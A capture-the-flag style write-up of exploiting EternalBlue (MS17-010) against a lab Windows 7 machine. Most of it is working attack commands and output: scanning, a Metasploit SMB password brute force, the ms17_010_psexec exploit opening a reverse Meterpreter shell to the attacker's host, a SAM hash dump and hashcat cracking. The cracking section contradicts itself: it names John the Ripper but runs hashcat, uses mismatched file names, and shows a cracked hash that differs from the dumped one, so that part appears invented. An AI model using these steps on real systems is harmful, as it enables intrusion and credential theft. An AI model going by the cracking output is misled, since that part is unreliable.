# EternalBlue (MS17-010) Exploitation Writeup

---
## Summary

EternalBlue is an exploit developed by the NSA and leaked by the Shadow Brokers in 2017. It targets a flaw in Microsoft’s implementation of the SMB protocol, specifically versions 1.0, enabling attackers to send specially designed packets to a vulnerable system. This exploit gained notoriety due to its use in the WannaCry ransomware attack, which caused widespread damage across the globe.

---

## Scanning and Enumeration

> scanning the target ip to identify the gatekeeper (open port(s)).


```
└─$ nmap -sV -A -Pn 192.168.0.210  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 06:57 -0500  
Nmap scan report for unix-PC (192.168.0.210)  
Host is up (0.00041s latency).  
Not shown: 993 filtered tcp ports (no-response)  
PORT STATE SERVICE VERSION  
135/tcp open msrpc Microsoft Windows RPC  
139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
445/tcp open microsoft-ds Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  
554/tcp open rtsp?  
2869/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Service Unavailable  
10243/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
MAC Address: 08:00:27:D1:41:B3 (Oracle VirtualBox virtual NIC)  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: specialized|phone  
Running: Microsoft Windows 7|Phone  
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows  
OS details: Microsoft Windows Embedded Standard 7, Microsoft Windows Phone 7.5 or 8.0  
Network Distance: 1 hop  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:  
| smb-os-discovery:  
| OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)  
| OS CPE: cpe:/o:microsoft:windows_7::sp1  
| Computer name: unix-PC  
| NetBIOS computer name: UNIX-PC\x00  
| Workgroup: WORKGROUP\x00  
|_ System time: 2026-02-23T14:59:43+03:00  
| smb-security-mode:  
| account_used: <blank>  
| authentication_level: user  
| challenge_response: supported  
|_ message_signing: disabled (dangerous, but default)  
| smb2-security-mode:  
| 2.1:  
|_ Message signing enabled but not required  
|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: 0s  
|_nbstat: NetBIOS name: UNIX-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:d1:41:b3 (Oracle VirtualBox virtual NIC)  
| smb2-time:  
| date: 2026-02-23T11:59:43  
|_ start_date: 2026-02-23T02:45:01  
  
TRACEROUTE
```

---

## Scanning result analysis

 the target is running Windows 7 Ultimate with SMB (Server Message Block) and the gatekeeper is ports: 135, 139, 445. 

 however based on the script scanning result shows that:
 
 - NetBIOS name: UNIX-PC
 - Computer name: unix-pc 
 - NetBios computer name: UNIX-PC\x00.
 
 When Windows configured the system create user account in the format of username-PC. 
 This implies that the user on the target system might be ‘unix’.

## Finding potential vulnerability

 using nmap script engine to scan for know vulnerability for our target.

```
└─$ nmap --script=vuln 192.168.0.210  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 07:26 -0500  
Nmap scan report for unix-PC (192.168.0.210)  
Host is up (0.00061s latency).  
Not shown: 993 filtered tcp ports (no-response)  
PORT STATE SERVICE  
135/tcp open msrpc  
139/tcp open netbios-ssn  
445/tcp open microsoft-ds  
554/tcp open rtsp  
2869/tcp open icslap  
5357/tcp open wsdapi  
10243/tcp open unknown  
MAC Address: 08:00:27:D1:41:B3 (Oracle VirtualBox virtual NIC)  
  
Host script results:  
|_smb-vuln-ms10-054: false  
| smb-vuln-ms17-010:  
| VULNERABLE:  
| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)  
| State: VULNERABLE  
| IDs: CVE:CVE-2017-0143  
| Risk factor: HIGH  
| A critical remote code execution vulnerability exists in Microsoft SMBv1  
| servers (ms17-010).  
|  
| Disclosure date: 2017-03-14  
| References:  
| https://technet.microsoft.com/en-us/library/security/ms17-010.aspx  
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143  
|_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/  
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED  
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED  
  
Nmap done: 1 IP address (1 host up) scanned in 44.72 seconds

```

result shows that the target is vulnerable to ms17–010, this vulnerability provides Remote Code Execution hence allows full control of the system.

## Enumeration

 let’s explore more and check if there is existing POC or exploit ready. using exploit db online or searchsploit (exploit-db) on local mashine.

```
└─$ searchsploit ms17-010  
--------------------------------------------------------------------------------------- 
Exploit Title | Path  
----------------------------------------------------------------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010) | windows/remote/43970.rb  
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit) | windows/dos/41891.rb  
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) | windows/remote/42031.py  
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010) | windows/remote/42315.py  
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010) | windows_x86-64/remote/42030.py  
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010) | windows_x86-64/remote/41987.py  
----------------------------------------------------------------------------------------
Shellcodes: No Results
```


Hooray!!!!!!!!, the enumeration show that we can find the target exploitation modules and payload using **Metasploit Framework.**

## Share Enumeration

trying to connect with empty password and it reject, this show that it is password protected.

```
└─$ smbclient -L 192.168.0.210  
Password for [WORKGROUP\unix]:  
Anonymous login successful  
  
Sharename Type Comment  
--------- ---- -------  
Reconnecting with SMB1 for workgroup listing.  
do_connect: Connection to 192.168.0.210 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)  
Unable to connect with SMB1 -- no workgroup available
```


## Exploitation Time: Msfconsole into place.

### Brute-forcing login: smb_login into play

Start the msfconsole and search ‘smb_login’


```
msf > search smb_login  
  
Matching Modules  
================  
  
# Name Disclosure Date Rank Check Description  
- ---- --------------- ---- ----- -----------  
0 auxiliary/scanner/smb/smb_login . normal No SMB Login Check Scanner  
  
  
Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_login  
  
msf >
```

now we have to set the required options such as;

*rhosts*: the target machine (victims) ip.

*smbuser*: target username to use

*pass_file*: target password wordlist to use (make sure to use the effective one)


```
msf auxiliary(scanner/smb/smb_login) > set rhosts 192.168.0.210  
rhosts => 192.168.0.210  
msf auxiliary(scanner/smb/smb_login) > set smbuser unix  
smbuser => unix  
msf auxiliary(scanner/smb/smb_login) > set pass_file /usr/share/wordlists/metasploit/default_userpass_for_services_unhash.txt  
pass_file => /usr/share/wordlists/metasploit/default_users_for_services_unhash.txt  
msf auxiliary(scanner/smb/smb_login) >

```


run the modules to see if we would succeed on finding the password (if its weak).

```
msf auxiliary(scanner/smb/smb_login) > run  
[*] 192.168.0.210:445 - 192.168.0.210:445 - Starting SMB login bruteforce  
[-] 192.168.0.210:445 - 192.168.0.210:445 - Failed: '.\unix:admin admin',  
[!] 192.168.0.210:445 - No active DB -- Credential data will not be saved!  
[-] 192.168.0.210:445 - 192.168.0.210:445 - Failed: '.\unix: ',  
.  
.  
.  
[+] 192.168.0.210:445 - 192.168.0.210:445 - Success: '.\unix:unix'  
[*] 192.168.0.210:445 - Scanned 1 of 1 hosts (100% complete)  
[*] 192.168.0.210:445 - Bruteforce completed, 1 credential was successful.  
[*] 192.168.0.210:445 - You can open an SMB session with these credentials and CreateSession set to true  
[*] Auxiliary module execution completed
```


Awesome!!! we got the password already, now lets move to exploitation phase.


## Exploitation of Eternalblue.


searching ‘eternalblue’ with filtering the output to ‘exploit’ module to reduce noise.


```
msf auxiliary(scanner/smb/smb_login) > grep exploit search eternalblue  
 	0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption  
 	10 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution  
 	27 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution  
Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce  
msf auxiliary(scanner/smb/smb_login) >
```

we got two exploit modules that would be in handy. Based on our enumeration above we could use either **/ms17_010_eternalblue** or **/ms17_010_psexec.**


### **using /ms17_010_ternalblue**

 follows the following steps to use /ms17_010_eternablue;
 
> i. rhosts: target / victims ip
> ii. smbuser: target username
> iii. smbpass: corresponding password for smbuser



```
msf auxiliary(scanner/smb/smb_login) > use exploit/windows/smb/ms17_010_eternalblue  
[*] Using configured payload windows/x64/meterpreter/reverse_tcp  
msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.0.210  
rhosts => 192.168.0.210  
msf exploit(windows/smb/ms17_010_eternalblue) > check  
[*] 192.168.0.210:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check  
[+] 192.168.0.210:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x86 (32-bit)  
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression  
[*] 192.168.0.210:445 - Scanned 1 of 1 hosts (100% complete)  
[+] 192.168.0.210:445 - The target is vulnerable.  
msf exploit(windows/smb/ms17_010_eternalblue) >
```

Hit the Jackpot !!!!!!!!!!!!!!!!, the target is vulnerable to ms71_010_eternalblue.


```
msf exploit(windows/smb/ms17_010_eternalblue) > exploit  
[*] Started reverse TCP handler on 192.168.0.36:4444  
[*] 192.168.0.210:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check  
[+] 192.168.0.210:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x86 (32-bit)  
[*] 192.168.0.210:445 - Scanned 1 of 1 hosts (100% complete)  
[+] 192.168.0.210:445 - The target is vulnerable.  
[-] 192.168.0.210:445 - Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets  
[*] Exploit completed, but no session was created.  
msf exploit(windows/smb/ms17_010_eternalblue) >
```

Ohh my Gosh!!!!, the modules does not support 32-bit target, its’ only works for 64-bit target.



### Choosing the correct Module

since already have username and password (unix:unix) now lets try using exploit module **/ms17_010_psexec.**

```
msf exploit(windows/smb/ms17_010_eternalblue) > use exploit/windows/smb/ms17_010_psexec  
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp  
msf exploit(windows/smb/ms17_010_psexec) >
```

to use this modules you have to set the followings

> i. rhosts: target / victims ip
> ii. smbuser: target username
> iii. smbpass: corresponding password for smbuser

```
msf exploit(windows/smb/ms17_010_psexec) >  
msf exploit(windows/smb/ms17_010_psexec) > set smbuser unix  
smbuser => unix  
msf exploit(windows/smb/ms17_010_psexec) > set smbpass unix  
smbpass => unix  
msf exploit(windows/smb/ms17_010_psexec) > setg rhosts 192.168.0.210  
rhosts => 192.168.0.210  
msf exploit(windows/smb/ms17_010_psexec) > run  
[*] Started reverse TCP handler on 192.168.0.36:4444  
[*] 192.168.0.210:445 - Authenticating to 192.168.0.210 as user 'unix'...  
[*] 192.168.0.210:445 - Target OS: Windows 7 Ultimate 7601 Service Pack 1  
[*] 192.168.0.210:445 - Built a write-what-where primitive...  
[+] 192.168.0.210:445 - Overwrite complete... SYSTEM session obtained!  
[*] 192.168.0.210:445 - Selecting PowerShell target  
[*] 192.168.0.210:445 - Executing the payload...  
[+] 192.168.0.210:445 - Service start timed out, OK if running a command or non-service executable...  
[*] Sending stage (190534 bytes) to 192.168.0.210  
[*] Meterpreter session 1 opened (192.168.0.36:4444 -> 192.168.0.210:49234) at 2026-02-23 09:28:29 -0500  
  
meterpreter >
```


> the exploit module **/ms17_010_psexec** successful breach the system.


## Post Exploitation Phase

> since we are already breach the system and we are in, now its time for finding all treasure within the system.

###  SAM dump

> since we are already in, now we can view system most treasure data, such as user account and their corresponding hashed password, however can perform lateral movement etc.

```
  
meterpreter > hashdump  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
HomeGroupUser$:1001:aad3b435b51404eeaad3b435b51404ee:adf09e48747a2275afb869289f37d16a:::  
unix:1002:aad3b435b51404eeaad3b435b51404ee:07800b95e63f4c227788636b0a266046:::  
meterpreter >
```


## Nows cracking it 

### Step 1. Save the hashes

Create a file called `hashes.txt`

### Step 2. Crack with John the Ripper

```
$ hashcat -m 1000 administrator.txt rockyou.txt

hashcat (v6.2.6) starting...

OpenCL API (OpenCL 3.0)
=======================
* Device #1: NVIDIA GeForce RTX 4060, 8192 MB

Hashes: 1 digest; 1 unique digest

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344392
* Keyspace...: 14344392

Session..........: hashcat
Status...........: Running
Hash.Mode........: 1000 (NTLM)
Hash.Target......: administrator.txt

Time.Started.....: Tue Jul 1 10:30:00 2026
Speed.#1.........: 18.4 GH/s
Recovered........: 0/1 (0.00%)
Progress.........: 8456123/14344392 (58.95%)
Candidates.#1....: football -> Trustno1

5f4dcc3b5aa765d61d8327deb882cf99:Trustno1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: administrator.txt

Recovered........: 1/1 (100.00%)

Started: Tue Jul 1 10:30:00 2026
Stopped: Tue Jul 1 10:30:01 2026
```

If we then displayed the recovered result after the session, it might look like:

```
$ hashcat --show -m 1000 administrator.txt

Administrator:500:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:Trustno1
```


